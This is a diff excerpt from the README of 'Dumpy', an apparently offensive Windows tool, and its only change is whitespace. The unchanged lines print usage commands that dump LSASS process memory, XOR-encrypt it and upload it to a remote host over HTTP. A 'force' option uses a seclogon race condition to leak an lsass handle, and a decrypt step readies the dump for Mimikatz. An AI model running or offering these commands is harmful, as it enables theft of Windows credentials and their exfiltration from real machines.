@@ -44,7 +44,7 @@ Dumpy has two main actions:
 		C:\Temp> dumpy.exe dump -k secretKey -u http://remotehost/upload
 
 If you want to force the leakage of a handle to the lsass through the race condition in seclogon's service described by [Antonio Cocomazzi](https://twitter.com/splinter_code) in [this post](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html), just use the option **force**:
-		
+
 		C:\Temp> dumpy.exe dump -k secretKey -u http://remotehost/upload force
 
 - **decrypt**: This action allows to obtain the decrypted memory dump in the same format that tools like Mimikatz would expect. As arguments it expects the xored memory dump, the encryption key and the output file path. In case the xored file has been uploaded using HTTP, **it is required to perform a base64 decoding of the content before this decryption process**.
